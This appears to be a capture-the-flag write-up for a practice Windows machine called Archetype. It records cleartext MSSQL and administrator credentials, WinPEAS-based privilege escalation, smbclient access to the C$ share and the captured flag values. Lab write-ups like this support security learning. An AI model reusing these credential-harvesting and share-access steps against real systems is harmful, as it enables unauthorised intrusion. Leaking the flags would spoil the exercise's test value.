# user flag.txt

- Credentials obtained from prod.dtsConfig were used to log onto the MSSQL server.
	- User ID=ARCHETYPE\sql_svc
	- Password=M3g4c0rp123
	
```

C:\Users\sql_svc\Desktop>type user.txt
type user.txt
3e7b102e78218e935bf3f4951fec21a3

```

# root flag.txt
The sql_svc user was able to upload winpeas and run it on the host.  
It pointed out history that had cleartext credentials for the C$ SMB share.
- administrator
- MEGACORP_4dm1n!!

```
┌──(kali㉿kali)-[~]
└─$ smbclient -L //10.129.251.29/ -U administrator
Password for [WORKGROUP\administrator]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backups         Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.251.29 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

┌──(kali㉿kali)-[~]
└─$ smbclient  //10.129.251.29/C$ -U administrator --password='MEGACORP_4dm1n!!'    
Try "help" to get a list of possible commands.
smb: \> ls
  backups                             D        0  Mon Jan 20 05:20:57 2020
  Config.Msi                        DHS        0  Tue Jul 27 04:21:05 2021
  Documents and Settings          DHSrn        0  Sun Jan 19 23:39:33 2020
  pagefile.sys                      AHS 402653184  Sun Aug 17 16:05:08 2025
  PerfLogs                            D        0  Tue Jul 27 03:28:47 2021
  Program Files                      DR        0  Tue Jul 27 04:20:31 2021
  Program Files (x86)                 D        0  Tue Jul 27 04:20:09 2021
  ProgramData                       DHn        0  Tue Jul 27 03:28:47 2021
  Recovery                         DHSn        0  Sun Jan 19 23:39:33 2020
  System Volume Information         DHS        0  Sun Jan 19 23:38:58 2020
  Users                              DR        0  Sun Jan 19 23:39:46 2020
  Windows                             D        0  Tue Jul 27 04:22:30 2021

smb: \> get Users\Administrator\Desktop\root.txt
getting file \Users\Administrator\Desktop\root.txt of size 32 as Users\Administrator\Desktop\root.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)

```

```
┌──(kali㉿kali)-[~]
└─$ ls -l Users\\Administrator\\Desktop\\root.txt && md5sum Users\\Administrator\\Desktop\\root.txt
-rw-r--r-- 1 kali kali 32 Aug 17 16:18 'Users\Administrator\Desktop\root.txt'
\2b00dbf615f69cbf242b750d3d9f8a1f  Users\\Administrator\\Desktop\\root.txt

```